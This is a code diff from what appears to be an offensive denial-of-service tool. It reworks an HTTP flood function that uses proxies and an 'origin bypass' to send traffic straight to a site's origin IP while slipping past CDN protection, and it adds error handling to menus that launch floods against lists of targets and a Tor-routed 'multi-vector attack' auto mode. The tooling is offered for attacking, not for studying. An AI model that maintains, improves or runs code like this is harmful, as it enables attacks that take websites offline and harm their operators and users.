@@ -1598,6 +1598,10 @@ async def run_http_flood(target: str, cfg: dict):
             path += "?" + parsed.query
         effective_url = f"{scheme}://{opts['origin_ip']}{path}"
 
+    # Resolve host_header for origin bypass (SNI + HTTP Host header)
+    parsed_target = urlparse(target)
+    host_header = opts.get("host_header") or parsed_target.hostname or ""
+
     print(f"\n {c('c','[*]')} HTTP Flood | {target} | {duration}s | {rps} RPS")
     if opts.get("origin_ip"):
         print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']} (Host: {host_header})")
@@ -1621,10 +1625,6 @@ async def run_http_flood(target: str, cfg: dict):
                         proxy_urls.append(u)
         except Exception:
             proxy_urls = []
-
-    # Resolve host_header for origin bypass (SNI + HTTP Host header)
-    parsed_target = urlparse(target)
-    host_header = opts.get("host_header") or parsed_target.hostname or ""
 
     # Spin up the AutoDashboard for live per-vector RPS rendering.
     from core.monitor.auto_dashboard import AutoDashboard
@@ -3412,27 +3412,37 @@ async def _module_dispatch(module_func, multi_func, cfg, label="Target URL"):
     """Dispatch to single-target or multi-target module function."""
     print()
     raw = get_input(f" {label} ([1] enter manual, [2] target/target.txt, [ENTER] single): ").strip()
-    if raw == "2":
-        targets = load_target_lines()
-        if not targets:
-            print(f"  {c('r','[-]')} target/target.txt not found or empty")
-            return False
-        print(f"  {c('g','[+]')} {len(targets)} targets loaded:")
-        for i, t in enumerate(targets, 1):
-            print(f"      {i:2d}. {c('w',t)}")
-        if multi_func:
-            await multi_func(targets, cfg)
+    try:
+        if raw == "2":
+            targets = load_target_lines()
+            if not targets:
+                print(f"  {c('r','[-]')} target/target.txt not found or empty")
+                return False
+            print(f"  {c('g','[+]')} {len(targets)} targets loaded:")
+            for i, t in enumerate(targets, 1):
+                print(f"      {i:2d}. {c('w',t)}")
+            if multi_func:
+                await multi_func(targets, cfg)
+            else:
+                for t in targets:
+                    await module_func(t, cfg)
+            return True
         else:
-            for t in targets:
-                await module_func(t, cfg)
+            t = get_input(f" {label}: ").strip()
+            if not t:
+                return False
+            if label != "Target IP/Host" and not t.startswith(("http://", "https://")):
+                t = "https://" + t
+            await module_func(t, cfg)
+            return True
+    except KeyboardInterrupt:
+        print(f"\n {c('y','[!]')} Module cancelled by user")
         return True
-    else:
-        t = get_input(f" {label}: ").strip()
-        if not t:
-            return False
-        if label != "Target IP/Host" and not t.startswith(("http://", "https://")):
-            t = "https://" + t
-        await module_func(t, cfg)
+    except Exception as e:
+        import traceback
+        print(f"\n {c('r','[-]')} Module crashed: {type(e).__name__}: {e}")
+        print(f" {c('y','[!]')} Traceback:")
+        traceback.print_exc()
         return True
 
 async def cmd_menu(cfg):
@@ -3487,10 +3497,17 @@ async def cmd_menu(cfg):
             print(f"\n {c('c','[*]')} Auto Mode V5 starting...")
             print(f" {c('c','[*]')} Phase 0: Profile + Origin V2  -> Phase 1: Bayesian + V5 Vectors + L4")
             print(f" {c('c','[*]')} Phase 2: Multi-Vector Attack   -> Phase 3: Report")
-            from core.attack.strategies.auto_mode_v3 import run_auto_mode_v5
-            result = await run_auto_mode_v5(
-                target=target, duration=duration, tor_instances=tor_cnt,
-            )
+            try:
+                from core.attack.strategies.auto_mode_v3 import run_auto_mode_v5
+                result = await run_auto_mode_v5(
+                    target=target, duration=duration, tor_instances=tor_cnt,
+                )
+            except KeyboardInterrupt:
+                print(f"\n {c('y','[!]')} Module cancelled by user")
+            except Exception as e:
+                import traceback
+                print(f"\n {c('r','[-]')} Module 9 crashed: {type(e).__name__}: {e}")
+                traceback.print_exc()
             get_input(" Press Enter to continue...")
         elif choice == "N":
             if await _module_dispatch(run_advanced_2026, None, cfg):
